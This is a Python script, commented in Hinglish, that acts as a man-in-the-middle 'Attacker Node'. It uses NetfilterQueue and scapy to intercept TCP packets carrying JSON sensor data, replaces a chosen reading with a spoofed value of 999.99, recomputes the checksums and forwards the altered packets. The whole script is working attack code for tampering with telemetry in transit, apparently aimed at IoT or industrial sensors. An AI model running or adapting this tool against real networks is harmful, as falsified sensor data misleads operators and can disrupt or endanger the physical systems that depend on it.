from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import json
import traceback

TARGET_COLUMN = "p1"       # <-- APNI EXCEL KA ACTUAL COLUMN NAAM DAALO
SPOOFED_VALUE = 999.99     

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            raw_data = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Debug line taaki pata chale payload exact kaisa dikh raha hai
            print(f"\n[*] RAW PACKET: {raw_data.strip()}")
            
            if "sensor_id" in raw_data:
                modified = False
                new_payload_lines = []
                
                # TCP chunking fix: Har line ko alag JSON man kar process karo
                lines = raw_data.strip().split('\n')
                
                for line in lines:
                    if not line.strip(): 
                        continue
                        
                    try:
                        payload = json.loads(line)
                        
                        # Check karo ki TARGET_COLUMN dictionary me hai ya nahi
                        if "data" in payload and TARGET_COLUMN in payload["data"]:
                            original_val = payload["data"][TARGET_COLUMN]
                            payload["data"][TARGET_COLUMN] = SPOOFED_VALUE
                            
                            print(f"[!] INJECTION SUCCESS: {TARGET_COLUMN} = {original_val} -> {SPOOFED_VALUE}")
                            modified = True
                        
                        # Modified ya Unmodified payload ko list me wapas daalo
                        new_payload_lines.append(json.dumps(payload))
                        
                    except json.JSONDecodeError:
                        print(f"[-] JSON Parse Failed for chunk: {line}")
                        new_payload_lines.append(line) # Tuta hua data waise hi wapas bhej do
                
                # Agar kisi bhi line me attack hua hai, toh packet reconstruct karo
                if modified:
                    # Delimiter '\n' ke sath wapas combine karo (strict requirement for Server)
                    new_raw_data = '\n'.join(new_payload_lines) + '\n'
                    scapy_packet[scapy.Raw].load = new_raw_data.encode('utf-8')
                    
                    # Network Integrity fix
                    del scapy_packet[scapy.TCP].options
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.TCP].chksum
                    
                    packet.set_payload(bytes(scapy_packet))

    except Exception as e:
        print(f"\n[!] PACKET DROP ERROR: {e}")

    packet.accept()

queue = NetfilterQueue()
queue.bind(1, process_packet)
print("[*] Attacker Node Active. Intercepting on Queue 1...")
try:
    queue.run()
except KeyboardInterrupt:
    queue.unbind()